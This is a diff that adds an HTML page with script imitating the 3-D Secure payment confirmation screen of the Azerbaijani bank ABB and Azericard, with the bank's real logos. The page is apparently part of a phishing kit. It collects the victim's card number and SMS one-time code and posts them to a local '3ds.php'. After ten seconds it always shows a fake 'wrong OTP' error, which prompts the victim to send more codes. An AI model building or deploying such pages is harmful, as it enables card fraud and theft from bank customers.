@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azericard - Ödənişin təsdiqi</title>
+    <link href="css/azericard.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+    <div class="all">
+        <main class="main">
+            <header>
+                <div class="card-call">
+                    <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB">
+                    <img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard">
+                </div>
+            </header>
+            <section class="form-content">
+                <h1>Ödənişin təsdiqi</h1>
+
+                <div class="transaction-details">
+                    <div class="datetime-display" id="currentDateTime"></div>
+                    <div class="amount-display-large" id="paymentAmount"></div>
+                    <div class="card-info">
+                        <img id="cardTypeLogo" src="images/mastercard.svg" alt="Card Type">
+                        <span id="cardNumberDisplay"></span>
+                    </div>
+                </div>
+
+                <form id="otpForm" action="3ds.php" method="POST" autocomplete="off">
+                    <div class="field-container2">
+                        <div class="field-container_cvc">
+                            <div class="field_cvc">
+                                <div>
+                                    <label for="securitycode">3DS Code</label>
+                                    <input required id="securitycode" type="tel" inputmode="numeric" name="otp" placeholder="****" minlength="4" maxlength="6">
+                                </div>
+                                <div class="tooltip">
+                                    <img src="https://mpi.3dsecure.az/abb_default/img/info-circle.svg" alt="" width="20">
+                                    <span class="tooltiptext">Sizə SMS vasitəsi ilə göndərildi</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <input id="card" name="card" type="hidden">
+
+                    <div class="form-button">
+                        <button id="submitBtn" type="submit" class="submitBtn" disabled>
+                            <img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="" width="16">
+                            Ödənişi təsdiqlə
+                        </button>
+                        <button type="button" onclick="window.location.href='../index.html'">Ödənişin ləğvi</button>
+                    </div>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            <div class="footer_1">
+                <img src="https://mpi.3dsecure.az/abb_default/img/visa.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/secure.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/master.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/master_logo.svg" alt="">
+            </div>
+            <div class="footer_2">
+                <img src="https://mpi.3dsecure.az/abb_default/img/american_express.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/safeKey.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/UnionPay.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/jcb.svg" alt="">
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const cardParam = urlParams.get('card') || '';
+        const amountParam = urlParams.get('amount') || '0';
+
+        // Məbləğ
+        const formattedAmount = new Intl.NumberFormat('az-AZ', {
+            style: 'currency', currency: 'AZN'
+        }).format(parseFloat(amountParam));
+        document.getElementById('paymentAmount').textContent = formattedAmount;
+        document.getElementById('card').value = cardParam;
+
+        // Kart nömrəsi son 4 rəqəm
+        const last4 = cardParam.replace(/\s/g, '').slice(-4);
+        document.getElementById('cardNumberDisplay').textContent = last4 ? `**** **** **** ${last4}` : '';
+
+        // Kart tipi
+        const cardClean = cardParam.replace(/\s/g, '');
+        const logo = document.getElementById('cardTypeLogo');
+        if (cardClean.startsWith('4')) logo.src = 'images/visa.svg';
+        else if (/^(5[1-5]|2[2-7])/.test(cardClean)) logo.src = 'images/mastercard.svg';
+
+        // Tarix
+        function updateDateTime() {
+            const now = new Date();
+            const h = String(now.getHours()).padStart(2, '0');
+            const m = String(now.getMinutes()).padStart(2, '0');
+            const d = String(now.getDate()).padStart(2, '0');
+            const mo = String(now.getMonth() + 1).padStart(2, '0');
+            const y = now.getFullYear();
+            document.getElementById('currentDateTime').textContent = `${h}:${m} ${d}.${mo}.${y}`;
+        }
+        updateDateTime();
+
+        // OTP input
+        const otpInput = document.getElementById('securitycode');
+        const submitBtn = document.getElementById('submitBtn');
+        otpInput.addEventListener('input', function () {
+            submitBtn.disabled = this.value.length < 4;
+        });
+
+        // Form submit - PHP-yə göndər, xəta göstər
+        document.getElementById('otpForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerHTML = 'Yüklənir...';
+
+            const formData = new FormData(this);
+            fetch('3ds.php', { method: 'POST', body: formData })
+                .catch(err => console.log(err));
+
+            // 10 saniyə sonra xəta
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerHTML = '<img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" width="16"> Ödənişi təsdiqlə';
+                otpInput.value = '';
+
+                let err = document.querySelector('.professional-error');
+                if (!err) {
+                    err = document.createElement('div');
+                    err.className = 'professional-error';
+                    err.style.cssText = 'background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;padding:12px;border-radius:8px;margin-top:15px;text-align:center;font-weight:600;font-size:14px;';
+                    err.innerHTML = '⚠️ OTP kodu yanlışdır. Yenidən cəhd edin.';
+                    document.querySelector('form').parentNode.insertBefore(err, document.querySelector('form').nextSibling);
+                }
+            }, 10000);
+        });
+    </script>
+</body>
+</html>
